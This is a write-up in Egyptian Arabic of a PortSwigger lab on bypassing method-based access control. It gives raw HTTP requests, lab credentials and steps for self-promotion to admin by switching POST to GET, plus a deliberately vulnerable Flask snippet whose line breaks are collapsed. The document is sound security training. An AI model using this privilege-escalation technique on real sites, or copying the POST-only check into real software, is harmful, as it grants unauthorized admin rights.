# Lab : Method - based access control can be circumvented

https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

- الفكره من الLab ده ان ممكن تتحايل علي الموثع عنطريق تغير الmethod request  وتعمل upgrade للrole الخاصه بيك من غير اي تامين

```bash
1. GET /my-account?id=wiener HTTP/2
Host: 0a1d007004dcbc178202e746000500a4.web-security-academy.net
Cookie: session=TnvCafQXJrq8ZHgzp9fQF9IV3e3YO2TN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1d007004dcbc178202e746000500a4.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

2. GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a1d007004dcbc178202e746000500a4.web-security-academy.net
Cookie: session=TnvCafQXJrq8ZHgzp9fQF9IV3e3YO2TN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1d007004dcbc178202e746000500a4.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 0
```

اللاب ده من فئة **Broken Access Control**، وتحديدًا مشكلة اسمها **HTTP Method-based access control bypass**.

الفكرة إن التطبيق بيفرض قيود الصلاحيات (access control) بناءً **جزئيًا** على الـ **HTTP method** المستخدم في الريكوست (زي `POST` أو `GET`)، مش على منطق تحقق كامل من صلاحيات المستخدم نفسه. يعني endpoint معين (زي ترقية مستخدم لـ admin) بيتحقق من صلاحية الأدمن **بس لو الريكوست جاي بطريقة `POST`**، لكن لو نفس الـ endpoint اتنادى بطريقة **`GET`**، الفحص بيتجاهَل أو بيتخطى تمامًا.

### خطوات الحل بالتفصيل

#### 1. افهم سلوك الـ Admin panel الطبيعي

سجل دخول بحساب الأدمن:

```
administrator:admin
```

روح لصفحة **Admin panel**، هتلاقي فيها قائمة مستخدمين وزرار بجانب كل واحد لترقيته (Promote to admin) — زي `carlos`.

#### 2. اعترض ريكوست الترقية

اضغط على زرار **Promote** بتاع `carlos`، وابعت الريكوست ده على **Burp Repeater**. هيكون شكل الريكوست تقريبًا:

```
POST /admin/roles HTTP/1.1
Cookie: session=<admin-session>

csrf=...&username=carlos&action=upgrade
```

لاحظ إنه بطريقة **POST**.

#### 3. جرب تنفذ نفس الريكوست بحساب مش أدمن

افتح **نافذة Incognito/Private**، وسجل دخول بحساب:

```
wiener:peter
```

انسخ الـ **session cookie** بتاع `wiener` من الـ browser، والصقه في نفس الريكوست اللي في Repeater (بدل الـ session بتاع الأدمن).

ابعت الريكوست، هتلاقي الرد:

```
"Unauthorized"
```

يعني الفحص شغال، ومن خلال الـ `POST` مش هينفع كـ `wiener` عادي.

#### 4. جرب تغيير الـ method لحاجة غريبة (POSTX)

غيّر الـ method في سطر الطلب من `POST` لـ `POSTX` (method مش موجودة أصلاً):

```
POSTX /admin/roles HTTP/1.1
```

الرد هيتغير من "Unauthorized" لـ:

```
"missing parameter"
```

**ده مؤشر مهم جدًا**: معناه إن الكود اللي بيتحقق من الصلاحيات (access control check) **مربوط تحديدًا بشرط `method == POST`**. لما الـ method بقى حاجة تانية (`POSTX`)، الكود عدى الـ if بتاع الفحص، ودخل مباشرة لجزء تاني في الكود بيحاول يقرا الـ parameters (وده اللي طلع رسالة "missing parameter" لأن الـ parameters كانت متبعتة كـ form data بتاعة POST مش كـ query string).

#### 5. حوّل الريكوست لـ GET method فعلي

دلوقتي بما إننا عرفنا إن أي method غير `POST` بتتخطى الفحص، نحول الريكوست لـ **GET** حقيقية (مش `POSTX` وهمية) — من Burp: كليك يمين على الريكوست واختار:

```
"Change request method"
```

ده هيحول الريكوست تلقائيًا لـ:

```
GET /admin/roles?csrf=...&username=carlos&action=upgrade HTTP/1.1
```

(الـ parameters بتتحول تلقائيًا لـ query string).

#### 6. استهدف حسابك بدل carlos

غيّر قيمة الـ `username` في الـ query string من `carlos` لاسم المستخدم بتاعك:

```
GET /admin/roles?csrf=...&username=wiener&action=upgrade HTTP/1.1
Cookie: session=<wiener-session>
```

ابعت الريكوست، ولو الاستغلال نجح، هيرجع رد إيجابي، ومعناه إنك رقّيت نفسك (`wiener`) لـ admin.

#### 7. تأكيد الحل

ارجع للصفحة الرئيسية أو صفحة الحساب، لو بقيت admin فعليًا، اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

الكود على الأرجح شبه كده:

python

```python
@app.route("/admin/roles", methods=["POST", "GET"])def upgrade_role():    if request.method == "POST":        if not current_user.is_admin:            return "Unauthorized", 401    username = request.form.get("username")  # لو مفيش form data (زي في GET) → "missing parameter"    ...    promote_user(username)
```

المشكلة واضحة: فحص الصلاحية (`is_admin`) **جوه شرط `if request.method == "POST"` بس**. لو الريكوست جه بطريقة `GET`، الكود عدى الفحص بالكامل ونفذ عملية الترقية مباشرة، وبما إن Flask (أو أي framework مشابه) بيقبل الـ parameters كـ query string في حالة الـ GET، العملية نجحت.

### الدرس المستفاد

- **الاعتماد على HTTP method كجزء من منطق الـ access control خطأ جسيم** — الـ method مجرد تفصيلة في بروتوكول النقل، مش وسيلة موثوقة للتحقق من الهوية أو الصلاحية.
- أي endpoint بيقبل أكتر من HTTP method (`GET` و `POST` مثلاً) لازم يطبق **نفس فحص الصلاحيات بالظبط** بغض النظر عن الـ method المستخدم.
- الحل الصحيح: يتم فحص `is_admin` **قبل** أي تفريع بناءً على الـ method، أو بشكل عام في middleware/decorator منفصل بيتنفذ على كل الطرق الممكنة لاستدعاء الـ endpoint، مش جوه شرط خاص بـ method واحد بس.
- التجربة بطريقة method غريبة زي `POSTX` هي تكنيك تشخيصي (diagnostic technique) مفيد جدًا لاكتشاف إن فيه فحص مربوط بشرط `method ==` تحديدًا، لأن رسالة الخطأ اتغيرت من "Unauthorized" (فحص صلاحيات) لـ "missing parameter" (فحص بيانات) — وده بيكشف إن الكود اتقسم لمرحلتين منفصلتين.
